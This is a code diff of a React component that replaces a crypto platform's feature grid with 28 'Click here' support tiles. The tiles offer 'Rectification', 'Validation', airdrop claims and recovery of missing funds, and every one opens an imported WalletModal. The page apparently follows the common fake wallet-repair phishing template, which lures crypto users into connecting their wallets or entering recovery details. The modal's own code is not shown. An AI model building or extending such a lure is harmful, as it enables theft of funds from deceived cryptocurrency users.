@@ -1,49 +1,64 @@
 "use client";
 
 import { 
-  Shield, 
-  Zap, 
-  Coins, 
-  Droplet, 
-  ArrowRightLeft, 
-  LifeBuoy, 
-  Bell, 
-  Lock, 
-  MessageSquare, 
-  Percent, 
-  BarChart2, 
-  UserPlus, 
-  Key, 
-  Layers, 
   Link as LinkIcon, 
-  Fingerprint, 
-  Activity, 
-  Users, 
-  PieChart, 
-  Share2 
+  Lock, 
+  ShieldCheck, 
+  Package, 
+  CircleDollarSign, 
+  LogIn, 
+  ArrowLeftRight, 
+  RotateCcw, 
+  Shield, 
+  LifeBuoy, 
+  LineChart, 
+  Wallet, 
+  MessageSquare, 
+  Box, 
+  Layers, 
+  Share2, 
+  LogOut, 
+  Disc, 
+  Image, 
+  Coins, 
+  ListChecks, 
+  Timer, 
+  Truck, 
+  ShoppingBag, 
+  BadgeDollarSign, 
+  MessagesSquare
 } from "lucide-react";
+import { WalletModal } from "@/components/WalletModal";
 
 const features = [
-  { icon: Shield, title: "Bank Grade Security", desc: "Multi-layered protection architecture with continuous threat monitoring and hardware-grade isolation." },
-  { icon: Zap, title: "Scalability", desc: "Built to handle high transaction volumes with zero downtime and ultra-low latency execution." },
-  { icon: Coins, title: "No Transactions", desc: "Optimized protocol layers that minimize or eliminate standard transaction friction for all users." },
-  { icon: Droplet, title: "Liquidity", desc: "Deep liquidity pools integrated across multiple venues ensuring minimal market impact." },
-  { icon: ArrowRightLeft, title: "Migration", desc: "Seamless and secure asset migration tools for moving liquidity between networks effortlessly." },
-  { icon: LifeBuoy, title: "Asset Recovery", desc: "Industry-first secure recovery and fallback infrastructure for mission-critical digital assets." },
-  { icon: Bell, title: "Wallet Notification", desc: "Real-time on-chain alerts pushed directly to your devices for every account movement." },
-  { icon: Lock, title: "Data Privacy", desc: "Advanced zero-knowledge encryption protocols to ensure your operational data remains private." },
-  { icon: MessageSquare, title: "Notification", desc: "Comprehensive system and market updates to keep you informed of critical protocol events." },
-  { icon: Percent, title: "Dynamic Fee", desc: "Intelligent fee structures that adapt to network congestion and provide cost-effective routing." },
-  { icon: BarChart2, title: "Slippage Protection", desc: "Sophisticated algorithms designed to protect your trades from front-running and high slippage." },
-  { icon: UserPlus, title: "Segregating Beneficiary", desc: "Isolated account structures for managing different beneficiaries with granular permissions." },
-  { icon: Key, title: "Backup password", desc: "Secure multi-factor authentication and decentralized recovery phrases for peace of mind." },
-  { icon: Layers, title: "Staking", desc: "Participate in network security and earn passive rewards through our integrated staking layer." },
-  { icon: LinkIcon, title: "Bridging", desc: "Secure cross-chain infrastructure for moving assets between fragmented ecosystems." },
-  { icon: Fingerprint, title: "Authorization", desc: "Granular role-based access control for enterprise-scale wallet management." },
-  { icon: Activity, title: "Monitoring", desc: "Deep analytics and real-time monitoring of all protocol interactions and asset flows." },
-  { icon: Users, title: "Sub-account", desc: "Manage multiple operational profiles under a single master identity for better organization." },
-  { icon: PieChart, title: "Asset tracking", desc: "Comprehensive portfolio visualization and historical performance metrics for all holdings." },
-  { icon: Share2, title: "Affiliate", desc: "Earn rewards and grow the ecosystem through our community-driven referral program." },
+  { icon: LinkIcon, title: "Connect to Dapps", desc: "Click here for error while connecting to Dapps." },
+  { icon: Lock, title: "Validation", desc: "Click here for validation." },
+  { icon: ShieldCheck, title: "Rectification", desc: "Click here for rectification." },
+  { icon: Package, title: "Claim Airdrop", desc: "Click here to claim Airdrop." },
+  { icon: CircleDollarSign, title: "Buy Token", desc: "Click here to buy tokens." },
+  { icon: LogIn, title: "Login", desc: "Click here for login related issues." },
+  { icon: ArrowLeftRight, title: "Migration", desc: "Click here for token migration." },
+  { icon: RotateCcw, title: "Restore", desc: "Click here for restoration related issues." },
+  { icon: Shield, title: "Reflection", desc: "Click here for issues related to reflection." },
+  { icon: LifeBuoy, title: "Assets Recovery", desc: "Click here for assets recovery issues." },
+  { icon: LineChart, title: "High Gas Fees", desc: "Click here for gas fee related issues." },
+  { icon: Wallet, title: "Claim Presale Token", desc: "Click here to claim presale token related issues." },
+  { icon: MessageSquare, title: "Slippage Error", desc: "Click here for slippage related error during trade." },
+  { icon: Box, title: "Transaction Error", desc: "Click here for transaction related issues." },
+  { icon: Layers, title: "Staking Issues", desc: "click here for staking related issues." },
+  { icon: ArrowLeftRight, title: "Swap/Exchange", desc: "Click here for swap/exchange related issues." },
+  { icon: Share2, title: "Cross Chain Transfer", desc: "Click here for gas fee related issues." },
+  { icon: LogOut, title: "Login Issues", desc: "Click here for issues while logging into your wallet." },
+  { icon: Disc, title: "Claim Airdrop", desc: "Click here for airdrop related issues." },
+  { icon: Image, title: "NFTs Issues", desc: "Click here for NFTs minting transfer related issues." },
+  { icon: Coins, title: "Missing/ Irregular Balance", desc: "Click here to recover lost missing funds." },
+  { icon: ListChecks, title: "Whitelist", desc: "Click here for whitelist related issues." },
+  { icon: Timer, title: "Transaction Delay", desc: "Click here for any issues related to transaction delayed." },
+  { icon: Truck, title: "Migration Issues", desc: "Click here for migration related issues." },
+  { icon: ShoppingBag, title: "Trading Wallet", desc: "Click here if you have problem with your trading wallet." },
+  { icon: BadgeDollarSign, title: "Can't Buy Coins/Tokens", desc: "To trade crypto your account must be marked as a trusted payment source." },
+  { icon: Lock, title: "Locked Account", desc: "Click here for issues related to account lock." },
+  { icon: MessagesSquare, title: "Other Issues Not Listed", desc: "If you can't find the issue you are experiencing click here." },
 ];
 
 export function AdvantageGrid() {
@@ -61,15 +76,17 @@ export function AdvantageGrid() {
 
         <div className="grid md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
           {features.map((feature, i) => (
-            <div key={i} className="glass group p-6 rounded-[2rem] hover:bg-white/5 transition-all duration-300 border-white/5 hover:border-primary/20">
-              <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform duration-300">
-                <feature.icon className="text-primary w-6 h-6" />
-              </div>
-              <h3 className="font-headline text-lg font-bold mb-3">{feature.title}</h3>
-              <p className="text-slate-400 leading-relaxed text-xs">
-                {feature.desc}
-              </p>
-            </div>
+            <WalletModal key={i}>
+              <button className="glass group p-6 rounded-[2rem] hover:bg-white/5 transition-all duration-300 border-white/5 hover:border-primary/20 text-left w-full focus:outline-none focus:ring-2 focus:ring-primary/50">
+                <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform duration-300">
+                  <feature.icon className="text-primary w-6 h-6" />
+                </div>
+                <h3 className="font-headline text-lg font-bold mb-3">{feature.title}</h3>
+                <p className="text-slate-400 leading-relaxed text-xs">
+                  {feature.desc}
+                </p>
+              </button>
+            </WalletModal>
           ))}
         </div>
       </div>
